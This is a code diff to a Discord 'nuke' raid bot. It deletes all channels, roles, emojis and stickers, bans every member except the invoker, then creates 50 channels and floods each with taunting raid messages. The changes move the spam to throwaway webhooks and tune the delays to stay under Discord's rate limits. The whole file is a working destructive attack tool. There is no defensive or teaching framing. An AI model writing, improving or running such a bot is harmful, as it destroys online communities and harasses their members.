@@ -16,7 +16,7 @@ const CLIENT_ID = process.env.CLIENT_ID;
 const GUILD_ID = process.env.GUILD_ID || null;
 
 const CHANNEL_COUNT = 50;
-const MESSAGES_PER_CHANNEL = 1000;
+const MESSAGES_PER_CHANNEL = 50; // ← changed to 50
 const SPAM_TEXT = '🔥 GET RAIDED BY {username} - THIS SERVER IS OURS 🔥';
 
 client.once('ready', async () => {
@@ -24,7 +24,7 @@ client.once('ready', async () => {
   const rest = new REST({ version: '10' }).setToken(TOKEN);
   const commands = [{
     name: 'nuke',
-    description: '💀 Nuke + 50 channels + 1000 msgs each (Admin)',
+    description: '💀 Nuke + 50 channels + 50 msgs each (Admin)',
     default_member_permissions: PermissionsBitField.Flags.Administrator.toString()
   }];
   try {
@@ -74,37 +74,43 @@ async function executeNuke(ctx) {
   }
 
   // ---- DELETE ALL CHANNELS ----
+  console.log('🗑️ Deleting all channels...');
   for (const [, ch] of guild.channels.cache) {
-    try { await ch.delete(); await sleep(100); } catch (_) {}
+    try { await ch.delete(); await sleep(80); } catch (_) {}
   }
 
-  // ---- DELETE ROLES (except @everyone) ----
+  // ---- DELETE ROLES ----
+  console.log('🗑️ Deleting roles...');
   for (const [, role] of guild.roles.cache.filter(r => r.id !== guild.id)) {
-    try { await role.delete(); await sleep(100); } catch (_) {}
+    try { await role.delete(); await sleep(80); } catch (_) {}
   }
 
   // ---- DELETE EMOJIS ----
+  console.log('🗑️ Deleting emojis...');
   for (const [, emoji] of guild.emojis.cache) {
-    try { await emoji.delete(); await sleep(100); } catch (_) {}
+    try { await emoji.delete(); await sleep(80); } catch (_) {}
   }
 
   // ---- DELETE STICKERS ----
+  console.log('🗑️ Deleting stickers...');
   for (const [, sticker] of guild.stickers.cache) {
-    try { await sticker.delete(); await sleep(100); } catch (_) {}
+    try { await sticker.delete(); await sleep(80); } catch (_) {}
   }
 
   // ---- BAN ALL MEMBERS ----
+  console.log('🔨 Banning members...');
   let banned = 0;
   for (const [, member] of guild.members.cache) {
     if (member.id === author.id || member.id === client.user.id) continue;
     try {
       await member.ban({ reason: 'Nuke by ' + (author.user?.tag || author.tag) });
       banned++;
-      if (banned % 10 === 0) await sleep(200);
+      if (banned % 10 === 0) await sleep(150);
     } catch (_) {}
   }
 
   // ---- CREATE 50 CHANNELS ----
+  console.log(`📢 Creating ${CHANNEL_COUNT} channels...`);
   const channels = [];
   for (let i = 0; i < CHANNEL_COUNT; i++) {
     try {
@@ -117,46 +123,65 @@ async function executeNuke(ctx) {
         }]
       });
       channels.push(ch);
-      console.log(`✅ Created channel ${i+1}/${CHANNEL_COUNT}`);
-      if (i % 10 === 0) await sleep(300);
+      console.log(`✅ Created channel ${i+1}/${CHANNEL_COUNT}: ${ch.name}`);
+      if (i % 10 === 0) await sleep(200);
     } catch (err) {
-      console.error(`Failed to create channel ${i}:`, err.message);
+      console.error(`❌ Failed to create channel ${i}:`, err.message);
     }
   }
 
-  console.log(`📢 Created ${channels.length} channels. Starting spam...`);
+  console.log(`✅ Created ${channels.length} channels. Starting spam (${MESSAGES_PER_CHANNEL} msgs each)...`);
 
-  // ---- SPAM 1000 MESSAGES IN EACH CHANNEL (FORCE SPAM) ----
+  // ---- SPAM 50 MESSAGES PER CHANNEL USING WEBHOOKS ----
   let totalSent = 0;
   for (let chIdx = 0; chIdx < channels.length; chIdx++) {
     const channel = channels[chIdx];
+    console.log(`📨 Spamming channel ${chIdx+1}/${channels.length}: ${channel.name}`);
+
+    let webhook;
+    try {
+      webhook = await channel.createWebhook({
+        name: 'RAID-BOT',
+        avatar: 'https://i.imgur.com/4MQI7gI.png'
+      });
+    } catch (err) {
+      console.error(`❌ Webhook failed in ${channel.name}:`, err.message);
+      continue;
+    }
+
     let sent = 0;
     let failures = 0;
 
     for (let msgIdx = 0; msgIdx < MESSAGES_PER_CHANNEL; msgIdx++) {
       try {
-        await channel.send(`${spamText} [${msgIdx+1}/${MESSAGES_PER_CHANNEL}]`);
+        await webhook.send({
+          content: `${spamText} [${msgIdx+1}/${MESSAGES_PER_CHANNEL}]`,
+          username: author.user?.username || 'RAIDER'
+        });
         sent++;
         totalSent++;
-        failures = 0; // reset on success
+        failures = 0;
 
-        // Delay every 10 messages to avoid rate-limit
-        if (sent % 10 === 0) await sleep(150);
+        if (sent % 10 === 0) {
+          console.log(`   📤 ${channel.name} – ${sent}/${MESSAGES_PER_CHANNEL} sent`);
+        }
+
+        await sleep(80); // fast but safe
 
       } catch (err) {
         failures++;
-        console.log(`⚠️ Rate-limited on ${channel.name} (${failures} failures)`);
         if (failures > 5) {
-          console.log(`❌ Too many failures on ${channel.name}, moving to next channel.`);
-          break; // move to next channel if channel is dead
+          console.log(`❌ Too many failures on ${channel.name}, moving on.`);
+          break;
         }
-        await sleep(1000); // wait 1 second then retry
-        msgIdx--; // retry this message
+        await sleep(1000);
+        msgIdx--;
       }
     }
 
-    console.log(`✅ Channel ${chIdx+1}/${channels.length} – sent ${sent} messages`);
-    await sleep(200); // between channels
+    try { await webhook.delete(); } catch (_) {}
+    console.log(`✅ ${channel.name} – sent ${sent} messages`);
+    await sleep(150);
   }
 
   // ---- FINAL SUMMARY ----
